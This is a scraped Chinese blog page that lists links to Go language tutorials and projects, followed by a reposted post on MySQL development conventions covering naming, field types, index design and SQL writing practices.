<p><a href="https://learnku.com/articles/33876" target="_blank" rel="noopener">golang gin + gorm + seesion 完成 Laravel 的 make:auth</a></p>
<p><a href="https://learnku.com/articles/33873" target="_blank" rel="noopener">Golang 学习宝库</a></p>
<p><a href="https://github.com/pibigstar/go-demo" target="_blank" rel="noopener">学习go语言过程中写的一些例子和小项目</a></p>
<p><a href="https://learnku.com/articles/33708" target="_blank" rel="noopener">Go 实现常用设计模式（十）责任链模式</a></p>
<p><a href="https://juejin.im/post/5ce4dc17518825240245be5b" target="_blank" rel="noopener">Go 语言命令概览</a></p>
<p><a href="https://learnku.com/articles/33601" target="_blank" rel="noopener">密码学之对称加密</a></p>
<p><a href="https://www.guaosi.com/2019/03/14/golang-linkedlist/" target="_blank" rel="noopener">golang算法与数据结构</a></p>
<p><a href="https://github.com/xusenlin/ForestBlog" target="_blank" rel="noopener">用来展示 markdown 文档的博客</a></p>
<p><a href="https://learnku.com/articles/32582" target="_blank" rel="noopener">【GoLang 那点事】Go 指针</a></p>
<p><a href="http://www.golang365.com/#/blog/76" target="_blank" rel="noopener">go语言中的接口</a></p>
<p><a href="https://learnku.com/golang/t/32493" target="_blank" rel="noopener">Go 语言面向对象特性</a></p>
<p><a href="https://learnku.com/golang/t/34202" target="_blank" rel="noopener">如何写出优雅的 Golang 代码</a></p>
<p><a href="https://learnku.com/articles/34243" target="_blank" rel="noopener">内部 API 的安全</a></p>
<p><a href="https://gfw.go101.org/article/channel.html" target="_blank" rel="noopener"> Go 语言通道原理</a></p>
<p><a href="https://learnku.com/articles/32316" target="_blank" rel="noopener">Golang 写爬虫</a></p>
<p><a href="https://www.bilibili.com/video/av57667564/" target="_blank" rel="noopener">Golang 新手教程视频</a></p>
<p><a href="https://learnku.com/golang/t/31515" target="_blank" rel="noopener">golang 对接支付宝支付</a></p>
<p><a href="https://learnku.com/articles/31408" target="_blank" rel="noopener">Go 语言入门</a></p>
<p><a href="https://github.com/tianye/sensitive_words" target="_blank" rel="noopener">敏感词匹配</a></p>
<p><a href="https://learnku.com/golang/t/24598" target="_blank" rel="noopener">使用 go 的 gin 和 gorm 框架来构建 RESTful API 微服务</a></p>
<p><a href="https://learnku.com/articles/27591#faa0c7" target="_blank" rel="noopener">httprouter 源码分析</a></p>
<p><a href="https://www.guaosi.com/2019/03/22/golang-maze-breadth-first-search/" target="_blank" rel="noopener">golang算法与数据结构：走迷宫-广度优先算法</a></p>
<p><a href="https://learnku.com/articles/29791" target="_blank" rel="noopener">Swoole 协程与 Go 协程的区别</a></p>
<p><a href="https://learnku.com/articles/29375" target="_blank" rel="noopener">程序员工作以后该如何提升</a></p>
<p><a href="https://learnku.com/articles/29574" target="_blank" rel="noopener">Go 开发基础入门</a></p>
<p><a href="https://github.com/aceld/zinx" target="_blank" rel="noopener">完整视频代码及学习资料-Zinx 框架-Golang 轻量级 TCP 并发服务</a></p>
<p><a href="https://www.ganymedenil.com/2019/05/27/go-standard-library-by-parse-data-separated-by-commas.html" target="_blank" rel="noopener">go基础库之解析以逗号分隔的数据</a></p>
<p><a href="https://jiajunhuang.com/tutorial/golang/index.md" target="_blank" rel="noopener">Golang(Go语言)简明教程</a></p>
<p><a href="https://github.com/izghua/go-blog" target="_blank" rel="noopener">Golang+gin+vue+MySQL blog https:/www.iphpt.com</a></p>
<p><a href="https://www.njphper.com/posts/8b58ea6d.html" target="_blank" rel="noopener">Go Modules 详解</a></p>
<p><a href="https://github.com/xusenlin/ForestBlog" target="_blank" rel="noopener">markdown博客</a></p>
<p><a href="https://github.com/rylio/ytdl" target="_blank" rel="noopener">YouTube download library and CLI written in Go</a></p>
<p><a href="https://github.com/dchaofei/phone-identifies-gender" target="_blank" rel="noopener">根据手机号识性别</a></p>
<p><a href="https://github.com/developer-learning/learning-golang" target="_blank" rel="noopener">Go 学习之路</a></p>
<p><a href="https://www.njphper.com/posts/b2d15c51.html" target="_blank" rel="noopener">Golang 中的面向对象继承</a></p>
<p><a href="https://github.com/broqiang/mdblog" target="_blank" rel="noopener">Laravel 博客替换成了 Go 写的博客</a></p>
<p><a href="https://github.com/360EntSecGroup-Skylar/excelize" target="_blank" rel="noopener">Go 语言 Excel 类库 Excelize</a></p>
<p><a href="https://learnku.com/articles/26817" target="_blank" rel="noopener">Golang 中的面向对象</a></p>
<p><a href="https://learnku.com/articles/27591" target="_blank" rel="noopener">httprouter 源码分析</a></p>
<p><a href="https://learnku.com/articles/26056" target="_blank" rel="noopener">Go for PHP Developers</a></p>
<p><a href="https://github.com/JeffreyBool/array" target="_blank" rel="noopener"> golang 实现的泛型数组</a></p>
<p><a href="https://58hualong.cn/blog/post/liyong-go-laravel-broadcast-shixian-laravel-de-jishi-tongxun" target="_blank" rel="noopener"> go-Laravel-broadcast 实现 Laravel 的即时通讯</a></p>
<p><a href="https://learnku.com/articles/27808#topnav" target="_blank" rel="noopener">Golang 新手可能会踩的 50 个坑</a></p>
<p><a href="https://learnku.com/golang/wikis/27748" target="_blank" rel="noopener">使用 Go 语言的开源项目和公司</a></p>
<p><a href="https://learnku.com/articles/27561" target="_blank" rel="noopener">Go 如何实现 PHP 的密码加密解密</a></p>
<p><a href="https://github.com/dwg255/landlord" target="_blank" rel="noopener">golang 实现斗地主棋牌游戏</a></p>
<p><a href="https://learnku.com/articles/26715" target="_blank" rel="noopener">Go 编写 Web 应用</a></p>
<p><a href="https://github.com/Away0x/gin_weibo" target="_blank" rel="noopener">模仿 Laravel 的项目结构和风格</a></p>
<p><a href="https://broqiang.com/posts/http-client-base" target="_blank" rel="noopener">HTTP 客户端</a></p>
<p><a href="https://golang.google.cn/" target="_blank" rel="noopener">golang国内镜像</a></p>
<p><a href="https://www.alexedwards.net/blog/an-overview-of-go-tooling" target="_blank" rel="noopener">golang工具</a></p>
<p><a href="https://learnku.com/articles/27691" target="_blank" rel="noopener">Golang 使用 Map</a></p>
<p><a href="https://learnku.com/golang/t/27592" target="_blank" rel="noopener">奔跑的 Go</a></p>
<p><a href="https://learnku.com/articles/27561#topnav" target="_blank" rel="noopener">Go 如何实现 PHP 的密码加密解密</a></p>
<p><a href="https://www.zhanggaoyuan.com/article/8" target="_blank" rel="noopener">GOLANG 超大文件读取的两个方案</a></p>
<p><a href="https://learnku.com/articles/25470#topnav" target="_blank" rel="noopener">《 刻意学习 Golang - 标准库源码分析 》</a></p>
<p><a href="https://github.com/EpochCloud/quick" target="_blank" rel="noopener">专为微服务架构定制的高性能网关</a></p>
<p><a href="https://github.com/Kirk-Wang/Hello-Gopher/" target="_blank" rel="noopener">go扫盲</a></p>
<p><a href="http://www.yinwang.org/blog-cn/2014/04/18/golang" target="_blank" rel="noopener">对 Go 语言的综合评价</a></p>
<p><a href="https://learnku.com/golang/t/26104" target="_blank" rel="noopener">miniblink+golang 开发 Windows gui 应用</a></p>
<p><a href="https://huoding.com/2017/06/09/623" target="_blank" rel="noopener">通过实例入门Golang</a></p>
<p><a href="https://go-zh.org/doc/" target="_blank" rel="noopener">中文:文档首页</a></p>
<p><a href="https://learnku.com/articles/27401" target="_blank" rel="noopener">Go Modules 详解使用</a></p>
<p><a href="https://learnku.com/golang/t/28729#replies" target="_blank" rel="noopener">Golang 的轻量级 TCP 并发服务器框架</a></p>
<p><a href="https://github.com/SuperPony/Golang" target="_blank" rel="noopener">Golang 入门指南</a></p>
<p><a href="https://learnku.com/golang/t/24598" target="_blank" rel="noopener">用 go 的 gin 和 gorm 框架来构建 RESTful API 微服务</a></p>
<p><a href="https://hoxis.github.io/resource-heima-go.html" target="_blank" rel="noopener">go语言视频教程</a></p>
<p><a href="https://learnku.com/golang/t/24715#replies" target="_blank" rel="noopener">Golang 新手教程：入门速成指南</a></p>
<p><a href="https://github.com/SuperPony/Golang_Pkg" target="_blank" rel="noopener"> Go 官方包的学习</a></p>
<p><a href="https://github.com/360EntSecGroup-Skylar/excelize" target="_blank" rel="noopener">Go 语言 Excel 文档excelize</a></p>
<p><a href="https://github.com/youngxhui/GinHello" target="_blank" rel="noopener">Gin 学习示例代码</a></p>
<p><a href="https://goproxy.io/zh/" target="_blank" rel="noopener">golang代理</a></p>
<p><a href="https://github.com/jiujuan/go-collection" target="_blank" rel="noopener">go项目收集</a></p>
<p><a href="https://www.bookstack.cn/read/The-Golang-Standard-Library-by-Example/summary.md" target="_blank" rel="noopener">Go语言标准库</a></p>
<p><a href="https://github.com/dingdayu/phonedata" target="_blank" rel="noopener">手机归属地查询包</a></p>
<p><a href="https://learnku.com/articles/33318#reply106334" target="_blank" rel="noopener">go beego学习</a></p>
<p><a href="http://blog.rickiyang.cn/posts/42334b44.html" target="_blank" rel="noopener">Go基础语法学习(1)</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/07/mysql开发规范/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/07/mysql开发规范/" itemprop="url">mysql开发规范</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-07T20:20:46+08:00">
                2019-03-07
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  5.3k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  19 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><a href="https://learnku.com/articles/25020#topnav" target="_blank" rel="noopener">本文来自learnku</a></p>
<h3 id="数据命名规范"><a href="#数据命名规范" class="headerlink" title="数据命名规范"></a>数据命名规范</h3><p>所有数据库对象名称必须使用小写字母并用下划线分割。<br> 所有数据库对象名称禁止使用 MySQL 保留关键字（如果表名中包含关键字查询时，需要将其用单引号括起来）。<br> 数据库对象的命名要能做到见名识意，并且最后不要超过32个字符。<br>临时库表必须以 tmp_ 为前缀并以日期为后缀，备份表必须以 bak_ 为前缀并以日期 ( 时间戳 ) 为后缀。<br> 所有存储相同数据的列名和列类型必须一致（一般作为关联列，如果查询时关联列类型不一致会自动进行数据类型隐式转换，会造成列上的索引失效，导致查询效率降低）。<br>数据库基本设计规范</p>
<h4 id="1、所有表必须使用-InnoDB-存储引擎"><a href="#1、所有表必须使用-InnoDB-存储引擎" class="headerlink" title="1、所有表必须使用 InnoDB 存储引擎"></a>1、所有表必须使用 InnoDB 存储引擎</h4><p>没有特殊要求（即 InnoDB 无法满足的功能如：列存储，存储空间数据等）的情况下，所有表必须使用 InnoDB 存储引擎（MySQL 5.5 之前默认使用 Myisam，5.6 以后默认的为 InnoDB）InnoDB 支持事务，支持行级锁，更好的恢复性，高并发下性能更好。</p>
<h4 id="2、数据库和表的字符集统一使用-UTF8MB4"><a href="#2、数据库和表的字符集统一使用-UTF8MB4" class="headerlink" title="2、数据库和表的字符集统一使用 UTF8MB4"></a>2、数据库和表的字符集统一使用 UTF8MB4</h4><p>兼容性更好，统一字符集可以避免由于字符集转换产生的乱码，不同的字符集进行比较前需要进行转换会造成索引失效。</p>
<h4 id="3、所有表和字段都需要添加注释"><a href="#3、所有表和字段都需要添加注释" class="headerlink" title="3、所有表和字段都需要添加注释"></a>3、所有表和字段都需要添加注释</h4><p>使用 comment 从句添加表和列的备注 从一开始就进行数据字典的维护。</p>
<h4 id="4、尽量控制单表数据量的大小，建议控制在-500-万以内"><a href="#4、尽量控制单表数据量的大小，建议控制在-500-万以内" class="headerlink" title="4、尽量控制单表数据量的大小，建议控制在 500 万以内"></a>4、尽量控制单表数据量的大小，建议控制在 500 万以内</h4><p>500 万并不是 MySQL 数据库的限制，过大会造成修改表结构、备份、恢复都会有很大的问题，可以用历史数据归档（应用于日志数据），分库分表（应用于业务数据）等手段来控制数据量大小。</p>
<h4 id="5、谨慎使用-MySQL-分区表"><a href="#5、谨慎使用-MySQL-分区表" class="headerlink" title="5、谨慎使用 MySQL 分区表"></a>5、谨慎使用 MySQL 分区表</h4><p>分区表在物理上表现为多个文件，在逻辑上表现为一个表 谨慎选择分区键，跨分区查询效率可能更低 建议采用物理分表的方式管理大数据。</p>
<h4 id="6、尽量做到冷热数据分离，减小表的宽度"><a href="#6、尽量做到冷热数据分离，减小表的宽度" class="headerlink" title="6、尽量做到冷热数据分离，减小表的宽度"></a>6、尽量做到冷热数据分离，减小表的宽度</h4><p>MySQL 限制每个表最多存储 4096 列，并且每一行数据的大小不能超过 65535 字节 减少磁盘 IO，保证热数据的内存缓存命中率（表越宽，把表装载进内存缓冲池时所占用的内存也就越大,也会消耗更多的 IO） 更有效的利用缓存，避免读入无用的冷数据 经常一起使用的列放到一个表中（避免更多的关联操作）</p>
<h4 id="7、禁止在表中建立预留字段"><a href="#7、禁止在表中建立预留字段" class="headerlink" title="7、禁止在表中建立预留字段"></a>7、禁止在表中建立预留字段</h4><p>预留字段的命名很难做到见名识义 预留字段无法确认存储的数据类型，所以无法选择合适的类型 对预留字段类型的修改，会对表进行锁定</p>
<h4 id="8、禁止在数据库中存储图片，文件等大的二进制数据"><a href="#8、禁止在数据库中存储图片，文件等大的二进制数据" class="headerlink" title="8、禁止在数据库中存储图片，文件等大的二进制数据"></a>8、禁止在数据库中存储图片，文件等大的二进制数据</h4><p>通常文件很大，会短时间内造成数据量快速增长，数据库进行数据库读取时，通常会进行大量的随机 IO 操作，文件很大时，IO 操作很耗时 通常存储于文件服务器，数据库只存储文件地址信息。。</p>
<h4 id="9、禁止在线上做数据库压力测试"><a href="#9、禁止在线上做数据库压力测试" class="headerlink" title="9、禁止在线上做数据库压力测试"></a>9、禁止在线上做数据库压力测试</h4><h4 id="10、禁止从开发环境，测试环境直接连接生成环境数据库"><a href="#10、禁止从开发环境，测试环境直接连接生成环境数据库" class="headerlink" title="10、禁止从开发环境，测试环境直接连接生成环境数据库"></a>10、禁止从开发环境，测试环境直接连接生成环境数据库</h4><h3 id="数据库字段设计规范"><a href="#数据库字段设计规范" class="headerlink" title="数据库字段设计规范"></a>数据库字段设计规范</h3><h4 id="1-优先选择符合存储需要的最小的数据类型"><a href="#1-优先选择符合存储需要的最小的数据类型" class="headerlink" title="1. 优先选择符合存储需要的最小的数据类型"></a>1. 优先选择符合存储需要的最小的数据类型</h4><p>原因<br>列的字段越大，建立索引时所需要的空间也就越大，这样一页中所能存储的索引节点的数量也就越少也越少，在遍历时所需要的IO次数也就越多， 索引的性能也就越差</p>
<p>方法</p>
<h4 id="1、将字符串转换成数字类型存储，如：将IP地址转换成整形数据。"><a href="#1、将字符串转换成数字类型存储，如：将IP地址转换成整形数据。" class="headerlink" title="1、将字符串转换成数字类型存储，如：将IP地址转换成整形数据。"></a>1、将字符串转换成数字类型存储，如：将IP地址转换成整形数据。</h4><p>MySQL 提供了两个方法来处理 IP 地址</p>
<p>inet_aton 把ip转为无符号整型(4-8位)<br>inet_ntoa 把整型的ip转为地址<br>插入数据前，先用 inet_aton 把 IP 地址转为整型，可以节省空间。显示数据时，使用 inet_ntoa 把整型的 IP 地址转为地址显示即可。</p>
<h4 id="2、对于非负型的数据（如自增-ID、整型-IP）来说，要优先使用无符号整型来存储-因为无符号相对于有符号可以多出一倍的存储空间。"><a href="#2、对于非负型的数据（如自增-ID、整型-IP）来说，要优先使用无符号整型来存储-因为无符号相对于有符号可以多出一倍的存储空间。" class="headerlink" title="2、对于非负型的数据（如自增 ID、整型 IP）来说，要优先使用无符号整型来存储,因为无符号相对于有符号可以多出一倍的存储空间。"></a>2、对于非负型的数据（如自增 ID、整型 IP）来说，要优先使用无符号整型来存储,因为无符号相对于有符号可以多出一倍的存储空间。</h4><p>SIGNED INT -2147483648~2147483647<br>UNSIGNED INT 0~4294967295</p>
<p>VARCHAR(N) 中的 N 代表的是字符数，而不是字节数。使用 UTF8 存储 255 个汉字 Varchar(255)=765 个字节。过大的长度会消耗更多的内存</p>
<h4 id="2-避免使用-TEXT、BLOB-数据类型，最常见的TEXT类型可以存储64k的数据"><a href="#2-避免使用-TEXT、BLOB-数据类型，最常见的TEXT类型可以存储64k的数据" class="headerlink" title="2. 避免使用 TEXT、BLOB 数据类型，最常见的TEXT类型可以存储64k的数据"></a>2. 避免使用 TEXT、BLOB 数据类型，最常见的TEXT类型可以存储64k的数据</h4><p>建议把 BLOB 或是TEXT列分离到单独的扩展表中<br>MySQL 内存临时表不支持 TEXT、BLOB 这样的大数据类型，如果查询中包含这样的数据，在排序等操作时，就不能使用内存临时表，必须使用磁盘临时表进行。</p>
<p>而且对于这种数据，MySQL 还是要进行二次查询，会使 SQL 性能变得很差，但是不是说一定不能使用这样的数据类型。</p>
<p>如果一定要使用，建议把 BLOB 或是 TEXT 列分离到单独的扩展表中，查询时一定不要使用 select * 而只需要取出必要的列，不需要 TEXT 列的数据时不要对该列进行查询。<br>TEXT 或 BLOB 类型只能使用前缀索引<br>因为 MySQL 对索引字段长度是有限制的，所以 TEXT 类型只能使用前缀索引，并且 TEXT 列上是不能有默认值的。</p>
<h4 id="3-避免使用-ENUM-类型"><a href="#3-避免使用-ENUM-类型" class="headerlink" title="3. 避免使用 ENUM 类型"></a>3. 避免使用 ENUM 类型</h4><p>修改 ENUM 值需要使用 ALTER 语句<br>ENUM 类型的 ORDER BY 操作效率低，需要额外操作<br>禁止使用数值作为 ENUM 的枚举值</p>
<h4 id="4-尽可能把所有列定义为-NOT-NULL"><a href="#4-尽可能把所有列定义为-NOT-NULL" class="headerlink" title="4. 尽可能把所有列定义为 NOT NULL"></a>4. 尽可能把所有列定义为 NOT NULL</h4><p>原因：<br>索引 NULL 列需要额外的空间来保存，所以要占用更多的空间。<br>进行比较和计算时要对 NULL 值做特别的处理。</p>
<h4 id="5-使用-TIMESTAMP（4-个字节）或-DATETIME-类型（8-个字节）存储时间"><a href="#5-使用-TIMESTAMP（4-个字节）或-DATETIME-类型（8-个字节）存储时间" class="headerlink" title="5. 使用 TIMESTAMP（4 个字节）或 DATETIME 类型（8 个字节）存储时间"></a>5. 使用 TIMESTAMP（4 个字节）或 DATETIME 类型（8 个字节）存储时间</h4><p>TIMESTAMP 存储的时间范围 1970-01-01 00:00:01 ~ 2038-01-19-03:14:07。</p>
<p>TIMESTAMP 占用 4 字节和 INT 相同，但比 INT 可读性高，超出 TIMESTAMP 取值范围的使用 DATETIME 类型存储。</p>
<p>经常会有人用字符串存储日期型的数据（不正确的做法）：<br>缺点 1：无法用日期函数进行计算和比较。<br>缺点 2：用字符串存储日期要占用更多的空间。</p>
<h4 id="6-同财务相关的金额类数据必须使用-decimal-类型"><a href="#6-同财务相关的金额类数据必须使用-decimal-类型" class="headerlink" title="6. 同财务相关的金额类数据必须使用 decimal 类型"></a>6. 同财务相关的金额类数据必须使用 decimal 类型</h4><p>非精准浮点：float，double<br>精准浮点：decimal<br>Decimal 类型为精准浮点数，在计算时不会丢失精度。占用空间由定义的宽度决定，每 4 个字节可以存储 9 位数字，并且小数点要占用一个字节。可用于存储比 bigint 更大的整型数据。</p>
<h3 id="索引设计规范"><a href="#索引设计规范" class="headerlink" title="索引设计规范"></a>索引设计规范</h3><h4 id="1-限制每张表上的索引数量，建议单张表索引不超过-5-个"><a href="#1-限制每张表上的索引数量，建议单张表索引不超过-5-个" class="headerlink" title="1. 限制每张表上的索引数量，建议单张表索引不超过 5 个"></a>1. 限制每张表上的索引数量，建议单张表索引不超过 5 个</h4><p>索引并不是越多越好！索引可以提高效率同样也可以降低效率；索引可以增加查询效率，但同样也会降低插入和更新的效率，甚至有些情况下会降低查询效率。</p>
<p>因为 MySQL 优化器在选择如何优化查询时，会根据统一信息，对每一个可以用到的索引来进行评估，以生成出一个最好的执行计划，如果同时有很多个索引都可以用于查询，就会增加 MySQL 优化器生成执行计划的时间，同样会降低查询性能</p>
<h4 id="2-禁止给表中的每一列都建立单独的索引"><a href="#2-禁止给表中的每一列都建立单独的索引" class="headerlink" title="2. 禁止给表中的每一列都建立单独的索引"></a>2. 禁止给表中的每一列都建立单独的索引</h4><p>5.6 版本之前，一个 SQL 只能使用到一个表中的一个索引，5.6 以后，虽然有了合并索引的优化方式，但是还是远远没有使用一个联合索引的查询方式好</p>
<h4 id="3-每个-InnoDB-表必须有个主键"><a href="#3-每个-InnoDB-表必须有个主键" class="headerlink" title="3. 每个 InnoDB 表必须有个主键"></a>3. 每个 InnoDB 表必须有个主键</h4><p>InnoDB 是一种索引组织表：数据的存储的逻辑顺序和索引的顺序是相同的。每个表都可以有多个索引，但是表的存储顺序只能有一种 InnoDB是按照主键索引的顺序来组织表的。</p>
<p>不要使用更新频繁的列作为主键，不适用多列主键（相当于联合索引） 不要使用 UUID、MD5、HASH、字符串列作为主键（无法保证数据的顺序增长）。主键建议使用自增 ID 值。<br>常见索引列建议</p>
<p>出现在 SELECT、UPDATE、DELETE 语句的 WHERE 从句中的列。</p>
<p>包含在 ORDER BY、GROUP BY、DISTINCT 中的字段。</p>
<p>并不要将符合 1 和 2 中的字段的列都建立一个索引，通常将 1、2 中的字段建立联合索引效果更好。</p>
<p>多表 JOIN 的关联列。</p>
<p>如何选择索引列的顺序</p>
<p>建立索引的目的是：希望通过索引进行数据查找，减少随机 IO，增加查询性能 ，索引能过滤出越少的数据，则从磁盘中读入的数据也就越少。</p>
<p>区分度最高的放在联合索引的最左侧（区分度 = 列中不同值的数量 / 列的总行数）。<br>尽量把字段长度小的列放在联合索引的最左侧（因为字段长度越小，一页能存储的数据量越大，IO 性能也就越好）。<br>使用最频繁的列放到联合索引的左侧（这样可以比较少的建立一些索引）。<br>避免建立冗余索引和重复索引</p>
<p>因为这样会增加查询优化器生成执行计划的时间。</p>
<p>重复索引示例：primary key(id)、index(id)、unique index(id)</p>
<p>冗余索引示例：index(a,b,c)、index(a,b)、index(a）<br>优先考虑覆盖索引</p>
<p>对于频繁的查询优先考虑使用覆盖索引。</p>
<p>覆盖索引：就是包含了所有查询字段(where,select,ordery by,group by包含的字段)的索引</p>
<p>覆盖索引的好处：</p>
<p>避免 InnoDB 表进行索引的二次查询<br>InnoDB 是以聚集索引的顺序来存储的，对于 InnoDB 来说，二级索引在叶子节点中所保存的是行的主键信息，如果是用二级索引查询数据的话，在查找到相应的键值后，还要通过主键进行二次查询才能获取我们真实所需要的数据。而在覆盖索引中，二级索引的键值中可以获取所有的数据，避免了对主键的二次查询 ，减少了 IO 操作，提升了查询效率。</p>
<p>可以把随机 IO 变成顺序 IO 加快查询效率<br>由于覆盖索引是按键值的顺序存储的，对于 IO 密集型的范围查找来说，对比随机从磁盘读取每一行的数据 IO 要少的多，因此利用覆盖索引在访问时也可以把磁盘的随机读取的 IO 转变成索引查找的顺序 IO。<br>索引SET规范</p>
<p>尽量避免使用外键约束。</p>
<p>不建议使用外键约束（foreign key），但一定要在表与表之间的关联键上建立索引。</p>
<p>外键可用于保证数据的参照完整性，但建议在业务端实现。</p>
<p>外键会影响父表和子表的写操作从而降低性能。</p>
<h3 id="数据库SQL开发规范"><a href="#数据库SQL开发规范" class="headerlink" title="数据库SQL开发规范"></a>数据库SQL开发规范</h3><h4 id="1-建议使用预编译语句进行数据库操作"><a href="#1-建议使用预编译语句进行数据库操作" class="headerlink" title="1. 建议使用预编译语句进行数据库操作"></a>1. 建议使用预编译语句进行数据库操作</h4><p>预编译语句可以重复使用这些计划，减少 SQL 编译所需要的时间，还可以解决动态 SQL 所带来的 SQL 注入的问题 只传参数，比传递 SQL 语句更高效 相同语句可以一次解析，多次使用，提高处理效率。</p>
<h4 id="2-避免数据类型的隐式转换"><a href="#2-避免数据类型的隐式转换" class="headerlink" title="2. 避免数据类型的隐式转换"></a>2. 避免数据类型的隐式转换</h4><p>隐式转换会导致索引失效。如：<br>select name,phone from customer where id = ‘111’;</p>
<h4 id="3-充分利用表上已经存在的索引"><a href="#3-充分利用表上已经存在的索引" class="headerlink" title="3. 充分利用表上已经存在的索引"></a>3. 充分利用表上已经存在的索引</h4><p>避免使用双 % 号的查询条件。<br>如a like ‘%123%’，（如果无前置 %，只有后置 %，是可以用到列上的索引的）</p>
<p>一个 SQL 只能利用到复合索引中的一列进行范围查询<br>如：有 a,b,c 列的联合索引，在查询条件中有 a 列的范围查询，则在 b,c 列上的索引将不会被用到，在定义联合索引时，如果a列要用到范围查找的话，就要把 a 列放到联合索引的右侧。</p>
<p>使用 left join 或 not exists 来优化 not in 操作<br>因为 not in 也通常会使用索引失效。</p>
<h4 id="4-数据库设计时，应该要对以后扩展进行考虑"><a href="#4-数据库设计时，应该要对以后扩展进行考虑" class="headerlink" title="4. 数据库设计时，应该要对以后扩展进行考虑"></a>4. 数据库设计时，应该要对以后扩展进行考虑</h4><h4 id="5-程序连接不同的数据库使用不同的账号，进制跨库查询"><a href="#5-程序连接不同的数据库使用不同的账号，进制跨库查询" class="headerlink" title="5. 程序连接不同的数据库使用不同的账号，进制跨库查询"></a>5. 程序连接不同的数据库使用不同的账号，进制跨库查询</h4><p>为数据库迁移和分库分表留出余地<br>降低业务耦合度<br>避免权限过大而产生的安全风险</p>
<h4 id="6-禁止使用-SELECT-必须使用-SELECT-lt-字段列表-gt-查询"><a href="#6-禁止使用-SELECT-必须使用-SELECT-lt-字段列表-gt-查询" class="headerlink" title="6. 禁止使用 SELECT * 必须使用 SELECT &lt;字段列表&gt; 查询"></a>6. 禁止使用 SELECT * 必须使用 SELECT &lt;字段列表&gt; 查询</h4><p>消耗更多的 CPU 和 IO 以网络带宽资源<br>无法使用覆盖索引<br>可减少表结构变更带来的影响</p>
<h4 id="7-禁止使用不含字段列表的-INSERT-语句"><a href="#7-禁止使用不含字段列表的-INSERT-语句" class="headerlink" title="7. 禁止使用不含字段列表的 INSERT 语句"></a>7. 禁止使用不含字段列表的 INSERT 语句</h4><p>如：<br>insert into values (‘a’,’b’,’c’); </p>
<p>应使用：<br>insert into t(c1,c2,c3) values (‘a’,’b’,’c’);</p>
<h4 id="8-避免使用子查询，可以把子查询优化为-JOIN-操作"><a href="#8-避免使用子查询，可以把子查询优化为-JOIN-操作" class="headerlink" title="8. 避免使用子查询，可以把子查询优化为 JOIN 操作"></a>8. 避免使用子查询，可以把子查询优化为 JOIN 操作</h4><p>通常子查询在 in 子句中，且子查询中为简单 SQL ( 不包含 union、group by、order by、limit 从句 ) 时，才可以把子查询转化为关联查询进行优化。<br>子查询性能差的原因：<br>子查询的结果集无法使用索引，通常子查询的结果集会被存储到临时表中，不论是内存临时表还是磁盘临时表都不会存在索引，所以查询性能会受到一定的影响。<br>特别是对于返回结果集比较大的子查询，其对查询性能的影响也就越大。<br>由于子查询会产生大量的临时表也没有索引，所以会消耗过多的 CPU 和 IO 资源，产生大量的慢查询。</p>
<h4 id="9-避免使用-JOIN-关联太多的表"><a href="#9-避免使用-JOIN-关联太多的表" class="headerlink" title="9. 避免使用 JOIN 关联太多的表"></a>9. 避免使用 JOIN 关联太多的表</h4><p>对于 MySQL 来说，是存在关联缓存的，缓存的大小可以由 join_buffer_size 参数进行设置。</p>
<p>在 MySQL 中，对于同一个 SQL 多关联（join）一个表，就会多分配一个关联缓存，如果在一个 SQL 中关联的表越多，所占用的内存也就越大。</p>
<p>如果程序中大量的使用了多表关联的操作，同时 join_buffer_size 设置的也不合理的情况下，就容易造成服务器内存溢出的情况，就会影响到服务器数据库性能的稳定性。</p>
<p>同时对于关联操作来说，会产生临时表操作，影响查询效率 MySQL 最多允许关联 61 个表，建议不超过 5 个。</p>
<h4 id="10-减少同数据库的交互次数"><a href="#10-减少同数据库的交互次数" class="headerlink" title="10. 减少同数据库的交互次数"></a>10. 减少同数据库的交互次数</h4><p>数据库更适合处理批量操作 合并多个相同的操作到一起，可以提高处理效率</p>
<h4 id="11-对应同一列进行-or-判断时，使用-in-代替-or"><a href="#11-对应同一列进行-or-判断时，使用-in-代替-or" class="headerlink" title="11. 对应同一列进行 or 判断时，使用 in 代替 or"></a>11. 对应同一列进行 or 判断时，使用 in 代替 or</h4><p>In 的值不要超过 500 个， in 操作可以更有效的利用索引，or 大多数情况下很少能利用到索引。</p>
<h4 id="12-禁止使用-order-by-rand-进行随机排序"><a href="#12-禁止使用-order-by-rand-进行随机排序" class="headerlink" title="12. 禁止使用 order by rand() 进行随机排序"></a>12. 禁止使用 order by rand() 进行随机排序</h4><p>会把表中所有符合条件的数据装载到内存中，然后在内存中对所有数据根据随机生成的值进行排序，并且可能会对每一行都生成一个随机值，如果满足条件的数据集非常大，就会消耗大量的 CPU 和 IO 及内存资源。</p>
<p>推荐在程序中获取一个随机值，然后从数据库中获取数据的方式。</p>
